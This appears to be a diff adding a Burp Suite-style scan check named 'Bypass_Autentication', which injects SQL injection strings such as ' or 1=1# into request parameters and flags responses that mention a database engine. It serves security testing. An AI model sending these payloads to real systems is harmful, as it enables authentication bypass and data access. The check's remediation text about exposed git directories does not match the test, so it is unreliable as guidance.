@@ -1,0 +1,20 @@
+metadata:
+    language: v1-beta
+    name: "Bypass_Autentication"
+    description: "Bypass_Autentication"
+    author: "nu11secur1tuy"
+
+run for each:
+    inj = "nu11secur1ty' or 1=1#","'","'+OR+1=1--"
+
+given query or body insertion point then
+    send payload called check:
+        appending: {inj}
+
+    if {check.response.body} matches "(SQL|Postgresql|Microsoft Sql|sql|postgresql|microsoft sql)" then
+        report issue:
+            severity: info
+            confidence: firm
+            detail: `There is a change in response when {inj} is injected.`
+            remediation: "Ensure your git directories are not exposed."
+    end if
